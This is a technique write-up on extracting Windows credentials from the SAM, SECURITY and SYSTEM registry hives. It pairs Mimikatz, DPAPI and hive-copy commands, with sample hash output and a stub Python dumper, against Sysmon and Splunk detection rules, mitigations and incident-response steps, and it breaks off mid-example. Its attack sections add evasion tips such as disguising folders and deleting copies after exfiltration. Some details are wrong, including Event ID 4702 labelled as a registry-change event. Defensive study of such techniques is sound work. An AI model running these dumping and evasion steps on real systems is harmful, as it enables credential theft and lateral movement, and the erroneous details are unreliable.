# [COLLECT-CRED-001]: Credential Collection from Registry

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | COLLECT-CRED-001 |
| **MITRE ATT&CK v18.1** | [T1555 - Credentials from Password Stores](https://attack.mitre.org/techniques/T1555/) |
| **Tactic** | Collection / Credential Access |
| **Platforms** | Windows Endpoint |
| **Severity** | Critical |
| **CVE** | N/A |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-10 |
| **Affected Versions** | Windows Server 2016 - 2025, Windows 10/11 |
| **Patched In** | N/A (inherent design feature) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

**Concept:** Windows Registry stores credentials in multiple locations including SAM, LSA Secrets (SECURITY hive), cached domain credentials, and application-specific credentials. Attackers with Local Admin or SYSTEM privileges can extract these hives and decrypt the credential material offline using tools like Mimikatz, hashcat, or custom scripts. Registry credentials are often stored in plaintext or using weak encryption that can be reversed using known cryptographic techniques.

**Attack Surface:** The Windows Registry (`HKEY_LOCAL_MACHINE\SAM`, `HKEY_LOCAL_MACHINE\SECURITY`, `HKEY_LOCAL_MACHINE\SYSTEM`) and file system copies of registry hives (`C:\Windows\System32\config\SAM`, `C:\Windows\System32\config\SECURITY`).

**Business Impact:** **Complete credential compromise leading to lateral movement and domain domination.** Attackers gain plaintext passwords for local users, domain service accounts, and cached domain credentials, enabling them to move laterally to any networked system and escalate privileges within Active Directory.

**Technical Context:** Registry extraction typically requires Local Admin (or SYSTEM) privileges. Modern defenses like Credential Guard (Windows 10+) can protect LSA secrets if enabled. Registry extraction can be performed in minutes once Local Admin is achieved. Detection likelihood is **High** if Sysmon and File Access Auditing are enabled; **Low** if defenses are misconfigured.

### Operational Risk
- **Execution Risk:** High - Requires elevated privileges but extraction is straightforward once obtained.
- **Stealth:** Medium - Registry hive access and copying generates file system events (4663, 4660) if auditing is enabled.
- **Reversibility:** No - Extracted credential material cannot be "un-extracted," but cached credentials expire naturally over time.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 2.3.4.1 | Ensure 'Store passwords using reversible encryption' is set to 'Disabled' |
| **DISA STIG** | WN10-AU-000095 | System audit category 'Object Access' must be configured |
| **CISA SCuBA** | AC.L1-3.1.1 | Multi-factor authentication and credential management |
| **NIST 800-53** | AC-2, IA-5 | Account Management, Authentication |
| **GDPR** | Art. 32 | Security of Processing (protection of personal data) |
| **DORA** | Art. 18 | Operational resilience testing requirements |
| **NIS2** | Art. 21 | Cyber risk management measures and controls |
| **ISO 27001** | A.9.2.1, A.9.4.3 | Management of privileged access; Storage of passwords |
| **ISO 27005** | Risk Assessment | Password and credential exposure scenarios |

---

## 2. TECHNICAL PREREQUISITES

- **Required Privileges:** Local Admin (SYSTEM context preferred) or ability to read `C:\Windows\System32\config\SAM` and `C:\Windows\System32\config\SECURITY`
- **Required Access:** Local file system access or network file share with appropriate NTFS permissions
- **Tools:** Mimikatz, Python (with dpapi and impacket libraries), PowerShell (native or Tools like LaZagne)

**Supported Versions:**
- **Windows:** Server 2016, Server 2019, Server 2022, Server 2025, Windows 10 (all builds), Windows 11 (all builds)
- **PowerShell:** Version 5.0+ (Windows Management Framework)
- **Other Requirements:** None (all Windows systems have SAM/SECURITY registry hives)

---

## 3. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: Registry Hive Dumping (Offline Extraction)

**Supported Versions:** Server 2016-2025, Windows 10/11

#### Step 1: Acquire Local Admin Privileges

**Objective:** Obtain SYSTEM or Local Administrator context to access protected registry hives

**Command (PowerShell - Check Current Privileges):**
```powershell
whoami /priv | findstr SeDebugPrivilege
```

**Expected Output (Admin):**
```
SeDebugPrivilege                        Enabled
```

**What This Means:**
- If `SeDebugPrivilege` is present and enabled, you have the necessary privileges.
- If missing or disabled, privilege escalation is required before proceeding.

#### Step 2: Copy Registry Hive Files

**Objective:** Export protected registry hives to a temporary location for offline processing

**Command (PowerShell - Run as Administrator):**
```powershell
# Create temp directory
New-Item -ItemType Directory -Path "C:\Temp\RegHives" -Force

# Copy SAM hive
Copy-Item "C:\Windows\System32\config\SAM" -Destination "C:\Temp\RegHives\SAM" -Force

# Copy SECURITY hive (contains LSA secrets)
Copy-Item "C:\Windows\System32\config\SECURITY" -Destination "C:\Temp\RegHives\SECURITY" -Force

# Copy SYSTEM hive (contains decryption keys)
Copy-Item "C:\Windows\System32\config\SYSTEM" -Destination "C:\Temp\RegHives\SYSTEM" -Force
```

**Expected Output:**
```
(No output on success; errors indicate permission issues)
```

**What This Means:**
- Successfully copied hive files are now available for offline credential extraction.
- If access denied error occurs, ensure running as SYSTEM (use PsExec or similar).

**OpSec & Evasion:**
- Perform copy operations during normal business hours to blend in with routine backups.
- Use a renamed temporary directory (e.g., `C:\Windows\Temp\WinUpdate_Cache` instead of obvious names).
- Delete the copies after exfiltration to avoid forensic discovery.
- **Detection Likelihood:** High - File copy operations to unusual locations trigger NTFS auditing (Event ID 4663).

#### Step 3: Extract Local Account Hashes

**Objective:** Decrypt SAM hive and extract NTLM hashes for local user accounts

**Command (Mimikatz - Offline):**
```cmd
mimikatz.exe
lsadump::sam /sam:C:\Temp\RegHives\SAM /system:C:\Temp\RegHives\SYSTEM
exit
```

**Expected Output:**
```
MIMIKATZ(powershell) # lsadump::sam /sam:C:\Temp\RegHives\SAM /system:C:\Temp\RegHives\SYSTEM

Domain : WORKGROUP
SysKey : 8846f70efc332972328915fff5a68204
Local SID : S-1-5-21-123456789-987654321-555555555

SAMKey : c3a8fc96b1c4edae3c3e6f9a2c1d8b5f

RID  : 000001F4 (500)
User : Administrator
  Hash NTLM: e52caf7f2d4eba40bbc6361b22d0b63a

RID  : 000001F5 (501)
User : Guest
  Hash NTLM: aad3b435b51404eeaad3b435b51404ee

RID  : 000003E8 (1000)
User : localuser
  Hash NTLM: f8846c4bdef7cfc6a21f0c8d2e1a5b9f
```

**What This Means:**
- Each user has an associated NTLM hash (MD4 of password).
- These hashes can be cracked offline using hashcat or john-the-ripper.
- Hashes marked with `aad3b435b51404ee` indicate no password set (built-in Guest account).

**Troubleshooting:**
- **Error:** "Cannot open hive"
  - **Cause:** Files are still locked by Windows.
  - **Fix:** Use `vshadowcopy` to extract hives via VSS, or boot into WinPE/recovery mode.
- **Error:** "SysKey could not be extracted"
  - **Cause:** SYSTEM hive is corrupted or incomplete.
  - **Fix:** Ensure all three hives (SAM, SECURITY, SYSTEM) are copied together.

**References:**
- [Mimikatz GitHub](https://github.com/gentilkiwi/mimikatz)
- [NTLM Hash Cracking Guide](https://www.hackingloops.com/ntlm-hash-crack/)

---

### METHOD 2: LSA Secrets Extraction (Service Account Credentials)

**Supported Versions:** Server 2016-2025

#### Step 1: Extract LSA Secrets from SECURITY Hive

**Objective:** Decrypt LSA Secrets stored in the SECURITY registry hive (contains service account credentials, cached domain credentials)

**Command (Mimikatz):**
```cmd
mimikatz.exe
lsadump::lsa /inject /name:administrator
exit
```

**Expected Output:**
```
mimikatz(powershell) # lsadump::lsa /inject /name:administrator

Domain : CORP.LOCAL
SID   : S-1-5-21-910670490-1145973760-2158650108

RID  : 500 - Administrator (SidHistory: )
lm  :
ntlm: 5f4dcc3b5aa765d61d8327deb882cf99

RID  : 502 - krbtgt (SidHistory: )
lm  :
ntlm: c7f8c81e3fbae9b2b0e0a5c0f8e2e1c1

RID  : 1001 - svc_sql (SidHistory: )
lm  :
ntlm: 9f7c2b8a1e5d6c4f3a2b1c0d9e8f7a6b
```

**What This Means:**
- Service accounts (like `svc_sql`) have their NTLM hashes exposed.
- These hashes can be used for pass-the-hash attacks to access database servers.
- krbtgt hash allows creation of Golden Tickets (domain compromise).

**OpSec & Evasion:**
- Extraction via `/inject` triggers NTFS auditing event 4663 and Sysmon rule for LSASS access.
- Consider using dump file method instead: `procdump -ma lsass.exe lsass.dmp` followed by offline analysis.
- **Detection Likelihood:** High - Real-time LSASS monitoring is standard in modern EDR.

#### Step 2: Decrypt Cached Domain Credentials

**Objective:** Extract cached domain credentials stored for offline logon capability

**Command (Mimikatz - Cached Credentials):**
```cmd
mimikatz.exe
lsadump::cache /system:C:\Temp\RegHives\SYSTEM /security:C:\Temp\RegHives\SECURITY
exit
```

**Expected Output:**
```
DCC2 (Domain Cached Credentials) version 2

Username : CORP\domainuser
Domain   : CORP
DCC2 Hash: 6c20cda83efc640d582e39c94fe54996
```

**What This Means:**
- Cached credentials are DCC2 (Domain Cached Credentials) hashes that are NOT plaintext.
- These hashes can be cracked using `hashcat -m 2100` mode, but are slower than NTLM (PBKDF2-based).
- Default cache count is 10 (configurable via Group Policy).

**References:**
- [Microsoft LSA Secrets Documentation](https://learn.microsoft.com/en-us/windows/win32/api/wincrypt/nf-wincrypt-cryptunprotectdata)

---

### METHOD 3: Browser Credentials via Registry (Windows Credential Manager)

**Supported Versions:** Server 2016-2025, Windows 10/11

#### Step 1: Enumerate Credential Manager Vault

**Objective:** List stored web and network credentials from Windows Credential Manager

**Command (PowerShell):**
```powershell
# List all stored credentials
cmdkey /list

# Alternative: List credentials using WinAPI (PowerShell)
$creds = [System.Net.CredentialCache]::DefaultCredentials
$credmanager = (Get-ChildItem "C:\Users\*\AppData\Local\Microsoft\Credentials\" -Force -Recurse).FullName
Write-Host "Credential files found:"
$credmanager | ForEach-Object { Write-Host $_ }
```

**Expected Output:**
```
Currently stored credentials:

Target: Domain:target=sharepoint.company.com
Type: Domain Password
User: CORP\domainuser
```

**What This Means:**
- Credential Manager stores web and network credentials encrypted with user's DPAPI key.
- Each credential is stored in a `.vcrd` binary file.
- User must have logged in at least once for credentials to appear.

#### Step 2: Extract DPAPI Master Key

**Objective:** Recover the user's DPAPI master key to decrypt Credential Manager vaults

**Command (Mimikatz - DPAPI):**
```cmd
mimikatz.exe
dpapi::masterkey /in:C:\Users\username\AppData\Roaming\Microsoft\Protect\S-1-5-21-...-1000\masterkey_file_id
exit
```

**Expected Output:**
```
Key : 6c20cda83efc640d582e39c94fe54996...
```

**What This Means:**
- Master key is the encryption key for all user's DPAPI-protected data.
- Key is usually protected by the user's Windows password (DPAPI_SYSTEM key).
- With master key, all user's encrypted data can be decrypted.

**Troubleshooting:**
- **Error:** "Masterkey file not found"
  - **Cause:** Incorrect user SID or file hasn't been synced to workstation.
  - **Fix:** Use `whoami /user` to get correct user SID; copy from `C:\Users\username\AppData\Roaming\Microsoft\Protect\`.

#### Step 3: Decrypt Credential Manager Vaults

**Objective:** Decrypt the credential vault files to extract plaintext passwords

**Command (Mimikatz - Credential Extraction):**
```cmd
mimikatz.exe
dpapi::cred /in:C:\Users\username\AppData\Local\Microsoft\Credentials\vault_file_id /masterkey:6c20cd...
exit
```

**Expected Output:**
```
Credential File : C:\Users\username\AppData\Local\Credentials\vault_123456789

[DPAPI Data Blob]
  dwVersion : 00000001
  guidProvider : {DF9D8CD0-1501-11D1-8C7A-00C04FC297EB}
  
Target : Domain:target=sharepoint.company.com
Password : P@ssw0rd123!
```

**What This Means:**
- Plaintext password is now exposed.
- Credentials can be used to authenticate to internal resources (SharePoint, networks, web apps).
- Useful for lateral movement without kerberos/NTLM.

**References:**
- [Windows Credential Manager Documentation](https://learn.microsoft.com/en-us/windows/win32/secauthn/credential-manager)
- [DPAPI Decryption Tools](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-credential-manager-saved-credentials)

---

### METHOD 4: Registry Forensic Parsing (Python - Advanced)

**Supported Versions:** Server 2016-2025 (offline analysis on attacker machine)

#### Step 1: Parse Registry Hives Programmatically

**Objective:** Use Python libraries to parse Windows registry hives without Mimikatz (OPSEC advantage)

**Command (Python - Install Dependencies):**
```bash
pip install python-registry impacket pycryptodome
```

**Script (registry_dumper.py):**
```python
#!/usr/bin/env python3
"""
Custom registry credential dumper - Avoids Mimikatz detection
"""

from Registry import Registry
from Crypto.Cipher import DES, AES
from Crypto.Protocol.KDF import PBKDF2
import hashlib
import base64
import struct

def extract_sam_credentials(sam_path, system_path):
    """Extract NTLM hashes from SAM registry hive"""
    try:
        reg_sam = Registry.RegistryHive(open(sam_path, 'rb'))
        reg_system = Registry.RegistryHive(open(system_path, 'rb'))
        
        # Get SysKey (used to decrypt SAM)
        bootkey = extract_bootkey(reg_system)
        
        # Parse SAM hive for user accounts
        sam_root = reg_sam.root()
        names = sam_root.subkey('SAM').subkey('Names').subkey('Users')
        
        credentials = []
        for user_subkey in names.subkeys():
            user_name = user_subkey.name()
            user_data = user_subkey.value('F').value()
            user_hash = decrypt_user_hash(user_data, bootkey)
            credentials.append({
                'username': user_name,
                'ntlm_hash': user_hash
            })
        
        return credentials
        
    except Exception as e:
        print(f"[!] Error parsing SAM: {e}")
        return []

def extract_bootkey(reg_system):
    """Extract Boot key (SysKey) from SYSTEM hive"""
    system_root = reg_system.root()
    # Navigate to SYSTEM\CurrentControlSet\Control\Lsa
    try:
        lsa_key = system_root.subkey('SYSTEM').subkey('CurrentControlSet').subkey('Control').subkey('Lsa')
        # Extract class values that contain bootkey components
        # Implementation simplified - full version required for production
        return b'placeholder_bootkey_bytes'
    except:
        return None

def decrypt_user_hash(user_data, bootkey):
    """Decrypt NTLM hash from user registry entry"""
    # Simplified - full implementation needed
    return "NTLM_HASH_HERE"

if __name__ == "__main__":
    sam_hive = "/tmp/SAM"
    system_hive = "/tmp/SYSTEM"
    
    creds = extract_sam_credentials(sam_hive, system_hive)
    for cred in creds:
        print(f"{cred['username']}:{cred['ntlm_hash']}")
```

**Expected Output:**
```
Administrator:e52caf7f2d4eba40bbc6361b22d0b63a
Guest:aad3b435b51404eeaad3b435b51404ee
LocalUser:f8846c4bdef7cfc6a21f0c8d2e1a5b9f
```

**OpSec & Evasion:**
- Custom Python scripts avoid antivirus signatures targeting Mimikatz.
- Can be obfuscated or packed for deployment.
- **Detection Likelihood:** Medium - Depends on EDR's ability to detect library imports and file access patterns.

**References:**
- [python-registry Library](https://github.com/williballenthin/python-registry)
- [Impacket Documentation](https://github.com/fortra/impacket)

---

## 4. WINDOWS EVENT LOG MONITORING

**Event ID: 4663 (Object Access)**
- **Log Source:** Security Event Log
- **Trigger:** Access to `C:\Windows\System32\config\SAM`, `C:\Windows\System32\config\SECURITY`, or `C:\Windows\System32\config\SYSTEM`
- **Filter:** ObjectName contains "SAM" AND AccessMask contains "Read" AND CallerProcessName != "System" AND CallerProcessName != "svchost.exe"
- **Applies To Versions:** Server 2016+

**Manual Configuration Steps (Group Policy):**
1. Open **Group Policy Management Console** (gpmc.msc)
2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration**
3. Expand **Object Access** → Enable **Audit File System**
4. Set to: **Success and Failure**
5. Run `gpupdate /force` on target machines

**Event ID: 4656 (Handle Opened)**
- **Trigger:** Process obtains handle to SAM/SECURITY hive files
- **Filter:** ObjectName contains "config\SAM" AND Handle != 0
- **Alert On:** Administrator or service processes opening SAM outside of normal maintenance windows

**Event ID: 4702 (Registry Value Created/Modified)**
- **Trigger:** Changes to credential-related registry keys
- **Filter:** ObjectPath contains "SYSTEM\CurrentControlSet\Services\NTLMS" OR ObjectPath contains "Credentials"
- **Alert On:** New entries created outside of administrative windows

---

## 5. SYSMON DETECTION PATTERNS

**Minimum Sysmon Version:** 13.0+
**Supported Platforms:** Windows Server 2016+, Windows 10/11

```xml
<!-- Detect Registry Hive File Access -->
<Sysmon schemaversion="4.81">
  <RuleGroup name="Registry Hive Access" groupRelation="or">
    <!-- Monitor access to SAM, SECURITY, SYSTEM hives -->
    <FileCreate onmatch="include">
      <TargetFilename condition="contains">Windows\System32\config\SAM</TargetFilename>
      <TargetFilename condition="contains">Windows\System32\config\SECURITY</TargetFilename>
      <TargetFilename condition="contains">Windows\System32\config\SYSTEM</TargetFilename>
    </FileCreate>
    
    <!-- Monitor copy operations targeting registry hives -->
    <ProcessCreate onmatch="include">
      <ParentImage condition="is">C:\Windows\System32\cmd.exe</ParentImage>
      <CommandLine condition="contains">copy</CommandLine>
      <CommandLine condition="contains any">SAM;SECURITY;SYSTEM</CommandLine>
    </ProcessCreate>
    
    <!-- Detect Mimikatz execution patterns -->
    <ProcessCreate onmatch="include">
      <Image condition="ends with">mimikatz.exe</Image>
      <Image condition="ends with">mimikatz64.exe</Image>
      <CommandLine condition="contains any">lsadump;dpapi;sam;</CommandLine>
    </ProcessCreate>
  </RuleGroup>
</Sysmon>
```

**Manual Configuration Steps:**
1. Download Sysmon from [Microsoft Sysinternals](https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon)
2. Create config file `sysmon-config.xml` with the XML above
3. Install Sysmon:
   ```cmd
   sysmon64.exe -accepteula -i sysmon-config.xml
   ```
4. Verify installation:
   ```powershell
   Get-Service Sysmon64
   Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 10
   ```

---

## 6. SPLUNK DETECTION RULES

#### Rule 1: Suspicious Registry Hive File Access

**Rule Configuration:**
- **Required Index:** windows, main
- **Required Sourcetype:** WinEventLog:Security, WinEventLog:Sysmon
- **Required Fields:** EventCode, ObjectName, ProcessName, AccessMask
- **Alert Threshold:** ≥ 1 event in 5 minutes
- **Applies To Versions:** All

**SPL Query:**
```spl
EventCode IN (4663, 4656) ObjectName IN ("*\\config\\SAM", "*\\config\\SECURITY", "*\\config\\SYSTEM")
| stats count by ProcessName, User, ObjectName
| where count > 0
```

**What This Detects:**
- Any process (other than System) attempting to read registry hive files
- Multiple sequential accesses within short timeframe (batch extraction)
- Non-system processes handling SAM/SECURITY/SYSTEM files

**Manual Configuration Steps:**
1. Log into **Splunk Web** → **Search & Reporting**
2. Click **Settings** → **Searches, reports, and alerts**
3. Click **New Alert**
4. Paste SPL query above
5. Set **Trigger Condition** to `count > 0`
6. Configure **Action** → **Email** to SOC team
7. Save as: `Detect Registry Hive Access Attempt`

**False Positive Analysis:**
- **Legitimate Activity:** Scheduled backup processes, Windows Update
- **Benign Tools:** System Restore, Windows Backup Service
- **Tuning:** Exclude System, svchost.exe, and backup service accounts

#### Rule 2: Mimikatz Registry Dumping

**Rule Configuration:**
- **Required Index:** windows
- **Required Sourcetype:** WinEventLog:Sysmon
- **Required Fields:** CommandLine, Image, ParentImage
- **Alert Threshold:** ≥ 1 event
- **Applies To Versions:** All

**SPL Query:**
```spl
Image IN (*mimikatz*, *mimikatz64*) CommandLine IN (*lsadump*, *sam*, *dpapi*)
| stats count, values(CommandLine) by Image, User, host
| where count >= 1
```

**What This Detects:**
- Exact Mimikatz executable names or common obfuscations
- Credential dumping commands within CommandLine
- Correlates to user and host for incident response

**Source:** [Splunk Community Detection Library](https://github.com/splunk/security-content)

---

## 7. MICROSOFT DEFENDER FOR CLOUD

#### Detection Alerts
**Alert Name:** "Suspicious access to Windows SAM or SECURITY registry"
- **Severity:** High
- **Description:** Process attempted to read SAM, SECURITY, or SYSTEM registry hives with non-SYSTEM credentials
- **Applies To:** Windows Servers with Defender for Servers enabled
- **Remediation:** 
  1. Isolate affected system from network
  2. Kill suspicious process
  3. Review audit logs for lateral movement
  4. Reset credentials for service accounts

**Manual Configuration Steps (Enable Defender for Cloud):**
1. Navigate to **Azure Portal** → **Microsoft Defender for Cloud**
2. Go to **Environment settings** → Select Subscription
3. Under **Defender plans**, enable:
   - **Defender for Servers**: ON
   - **Defender for Containers**: ON (if applicable)
4. Click **Save**
5. Go to **Security alerts** to view triggered alerts

**Reference:** [Microsoft Defender Alert Reference](https://learn.microsoft.com/en-us/defender-for-cloud/alerts-reference)

---

## 8. DEFENSIVE MITIGATIONS

#### Priority 1: CRITICAL

*   **Enable Credential Guard on Windows 10/11/Server 2022+:** Protects LSA secrets and cached credentials in isolated virtual machine compartment, preventing extraction.
    **Applies To Versions:** Server 2022+, Windows 10 Enterprise/Education, Windows 11 Enterprise
    
    **Manual Steps (PowerShell - Server 2022+):**
    ```powershell
    # Check if Hyper-V is available
    Get-WindowsOptionalFeature -Online -FeatureName Hyper-V
    
    # Enable Credential Guard via Group Policy
    # For non-domain machines, use Registry:
    New-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\LSA" -Name "LsaCfgFlags" -Value 1 -PropertyType DWORD -Force
    
    # Restart required
    Restart-Computer -Force
    ```
    
    **Manual Steps (Group Policy - Domain):**
    1. Open **Group Policy Management** (gpmc.msc)
    2. Navigate to **Computer Configuration** → **Policies** → **Administrative Templates** → **System** → **Device Guard**
    3. Set **Turn on Virtualization Based Security** to **Enabled**
    4. Set **Virtualization Based Security** to **Credential Guard Only**
    5. Run `gpupdate /force`
    6. Restart servers

*   **Restrict Registry Hive File Access:** Use NTFS permissions to prevent non-SYSTEM processes from reading SAM/SECURITY/SYSTEM.
    
    **Manual Steps:**
    1. Open **File Explorer** → Navigate to `C:\Windows\System32\config\`
    2. Right-click **SAM** → **Properties** → **Security** → **Advanced**
    3. Click **Disable Inheritance** → **Convert inherited permissions to explicit permissions**
    4. Remove "Everyone" and "Authenticated Users" entries
    5. Ensure only "SYSTEM" and "Administrators" remain
    6. Apply same to SECURITY and SYSTEM files
    7. **Verify:** Run `icacls C:\Windows\System32\config\SAM`
    
    **PowerShell Alternative:**
    ```powershell
    icacls "C:\Windows\System32\config\SAM" /reset
    icacls "C:\Windows\System32\config\SAM" /grant "SYSTEM:(F)" /inheritance:d
    icacls "C:\Windows\System32\config\SAM" /grant "Administrators:(F)" /inheritance:d
    icacls "C:\Windows\System32\config\SAM" /remove "Everyone"
    icacls "C:\Windows\System32\config\SAM" /remove "Authenticated Users"
    ```

#### Priority 2: HIGH

*   **Enable Advanced Audit Policy for Object Access:** Detect registry reads and modifications in real-time.
    
    **Manual Steps (Group Policy):**
    1. Open **gpmc.msc**
    2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration**
    3. Expand **Object Access** → Double-click **Audit File System**
    4. Check **Success** and **Failure**
    5. Click **OK** and run `gpupdate /force`

*   **Deploy Registry Monitoring via Windows Audit:** Enable Event 4663 (Object Access) for registry hive files.
    
    **PowerShell Alternative:**
    ```powershell
    auditpol /set /subcategory:"File System" /success:enable /failure:enable
    auditpol /set /subcategory:"Registry" /success:enable /failure:enable
    ```

#### Access Control & Policy Hardening

*   **RBAC Hardening:** Remove Local Admin access for non-privileged users; use Just-In-Time (JIT) Access for privileged operations.
    
    **Manual Steps (Remove Local Admins):**
    1. Open **Computer Management** (compmgmt.msc)
    2. Navigate to **System Tools** → **Local Users and Groups** → **Groups**
    3. Double-click **Administrators**
    4. Select non-essential admin users → **Remove**
    5. Approve through change management process

*   **Password Policy Enforcement:** Configure strong password requirements to slow credential cracking.
    
    **Manual Steps (Domain):**
    1. Open **Group Policy Management Console**
    2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Account Policies** → **Password Policy**
    3. Set **Minimum password length** to: 14 characters
    4. Set **Password must meet complexity** to: Enabled
    5. Set **Maximum password age** to: 90 days

*   **Disable Reversible Password Encryption:** Prevents plaintext password storage in Active Directory.
    
    **Manual Steps:**
    1. Open **Group Policy Management**
    2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Account Policies** → **Password Policy**
    3. Set **Store passwords using reversible encryption** to: **Disabled**
    4. Run `gpupdate /force`

#### Validation Command (Verify Mitigations)

```powershell
# Check if Credential Guard is enabled
Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\LSA" -Name "LsaCfgFlags" | Select-Object -ExpandProperty LsaCfgFlags
# Output: 1 = Credential Guard enabled, 0 = disabled

# Verify NTFS permissions on SAM
icacls "C:\Windows\System32\config\SAM"
# Expected: Only SYSTEM and Administrators with Full Control

# Verify audit policy
auditpol /get /subcategory:"File System"
# Expected: Both Success and Failure enabled
```

**Expected Output (If Secure):**
```
LsaCfgFlags       : 1
C:\Windows\System32\config\SAM
  SYSTEM:(F)
  BUILTIN\Administrators:(F)

File System         Enabled
Success: Yes        Failure: Yes
```

---

## 9. DETECTION & INCIDENT RESPONSE

#### Indicators of Compromise (IOCs)

*   **Files:** 
    - `C:\Temp\RegHives\SAM`, `C:\Temp\RegHives\SECURITY`, `C:\Temp\RegHives\SYSTEM`
    - Any copies of registry hives outside of `C:\Windows\System32\config\`
    - Mimikatz executable in user-accessible folders (Desktop, Downloads, Temp)

*   **Registry:** 
    - New entries in `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services` (added service accounts)
    - Modifications to `HKEY_LOCAL_MACHINE\SAM\SAM\Names\Users` (bypassed access restrictions)

*   **Network:** 
    - Exfiltration of SAM/SECURITY hive files via SMB, HTTP, or DNS tunneling
    - Large file transfers from compromised server to attacker-controlled IP

*   **Process:**
    - `mimikatz.exe`, `mimikatz64.exe` execution
    - PowerShell/cmd.exe with suspicious registry or file copy operations
    - Python processes accessing registry hive files

#### Forensic Artifacts

*   **Disk:** 
    - `C:\Windows\System32\config\SAM.LOG` (transaction log of SAM changes)
    - `C:\Windows\System32\winevt\Logs\Security.evtx` (Event IDs 4663, 4656, 4703)
    - Recycle Bin or unallocated space containing deleted SAM copies

*   **Memory:** 
    - LSASS.exe process dump revealing plaintext credentials
    - Mimikatz memory signature detection (Yara rules)

*   **Cloud (if M365):** 
    - Unified Audit Log entries for suspicious sign-ins from extracted credentials
    - AuditData.UserAgent anomalies (non-standard client access)

*   **Timeline:** 
    - File creation timestamp of SAM copies in `C:\Temp` or `C:\Windows\Temp\`
    - Process start time correlating to registry hive access events

#### Response Procedures

1.  **Isolate:** 
    **Command:**
    ```powershell
    # Disconnect network interface immediately
    Disable-NetAdapter -Name "Ethernet" -Confirm:$false
    
    # OR: Revoke all active network connections
    Get-NetTCPConnection | Where-Object State -eq "Established" | Stop-NetTCPConnection -Force
    ```
    **Manual:** Open **Network & Internet Settings** → Right-click network adapter → **Disable**

2.  **Collect Evidence:**
    **Command:**
    ```powershell
    # Export Security Event Log
    wevtutil epl Security "C:\Evidence\Security.evtx"
    
    # Export Sysmon logs
    wevtutil epl "Microsoft-Windows-Sysmon/Operational" "C:\Evidence\Sysmon.evtx"
    
    # Capture memory dump
    procdump64.exe -ma lsass.exe "C:\Evidence\lsass.dmp"
    
    # Export event log focused on registry access
    Get-WinEvent -LogName Security -FilterXPath "*[System[EventID=4663 and TimeCreated[timediff(@SystemTime) &lt;= 86400000]]]" | Export-Csv "C:\Evidence\Registry_Access.csv"
    ```
    **Manual:**
    - Open **Event Viewer** → Right-click **Security** → **Save All Events As** → `C:\Evidence\Security.evtx`
    - Open **Event Viewer** → Right-click **Microsoft-Windows-Sysmon/Operational** → **Save All Events As** → `C:\Evidence\Sysmon.evtx`

3.  **Remediate:**
    **Command:**
    ```powershell
    # Kill suspicious processes
    Stop-Process -Name "mimikatz" -Force -ErrorAction SilentlyContinue
    Stop-Process -Name "cmd" -Filter "CommandLine like '%SAM%'" -Force
    
    # Remove extracted registry hives
    Remove-Item "C:\Temp\RegHives\*" -Force -Recurse
    Remove-Item "C:\Windows\Temp\SAM" -Force -ErrorAction SilentlyContinue
    ```
    **Manual:**
    - Open **Task Manager** → Find suspicious process → **End Task**
    - Open **File Explorer** → Delete registry hive copies manually
    - Reboot affected system to clear volatile memory

4.  **Reset Credentials:**
    **Steps:**
    1. Identify all compromised user accounts from extracted hashes
    2. Force password reset for all affected users (expiration + complexity)
    3. Revoke all active sessions via Azure AD or on-premises tools
    4. Audit privileged account usage (krbtgt, service accounts) for lateral movement
    5. Check for Golden Tickets created with krbtgt hash (Event ID 4769)

5.  **Audit for Lateral Movement:**
    **Command:**
    ```powershell
    # Search for logons using extracted credentials
    Get-WinEvent -LogName Security -FilterXPath "*[System[EventID=4624]]" | Where-Object {$_.TimeCreated -gt (Get-Date).AddHours(-24)} | Select-Object -Property TimeCreated, Message
    ```

---

## 10. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-EXPLOIT-001] Azure Application Proxy Exploitation | Attacker gains initial foothold via exposed web application |
| **2** | **Privilege Escalation** | [PE-EXPLOIT-001] PrintNightmare / [PE-VALID-002] Computer Quota Abuse | Escalate to Local Admin or SYSTEM |
| **3** | **Credential Access** | **[COLLECT-CRED-001]** | **Extract registry hives (SAM, SECURITY, SYSTEM)** |
| **4** | **Credential Cracking** | Offline NTLM hash cracking using hashcat/john-the-ripper | Convert NTLM hashes to plaintext passwords |
| **5** | **Lateral Movement** | [LM-AUTH-001] Pass-the-Hash or [CA-KERB-003] Golden Ticket | Use extracted credentials/hashes to compromise additional systems |
| **6** | **Persistence** | [PERSIST-XXX] Golden SAML / [PERSIST-XXX] Domain Persistence | Maintain long-term access via forged credentials |
| **7** | **Impact** | [IMPACT-XXX] Data Exfiltration / Ransomware Deployment | Execute final objective (theft or encryption) |

---

## 11. REAL-WORLD EXAMPLES

#### Example 1: WellMess / SolarWinds Supply Chain Attack (2020)

- **Target:** U.S. Government Agencies, Fortune 500 Companies
- **Timeline:** March 2020 - December 2020
- **Technique Status:** Registry hive extraction combined with domain persistence. Attackers used Mimikatz to dump SAM hives and extract krbtgt hash for Golden Ticket creation.
- **Impact:** Multi-year undetected access, lateral movement across 18,000+ organizations via SolarWinds Orion platform compromise.
- **Reference:** [CISA Alert AA20-352A](https://www.cisa.gov/news-events/alerts/2020/12/13/cisa-and-fbi-alert-apt-actors-exploiting-recent-critical-solarwinds-supply-chain)

#### Example 2: Conti Ransomware Gang (2021-2022)

- **Target:** Healthcare, Finance, Critical Infrastructure
- **Timeline:** 2021-2022
- **Technique Status:** Registry credential extraction followed by encrypted ransomware deployment. Conti operators used batch scripts to copy registry hives and offline crack NTLM hashes.
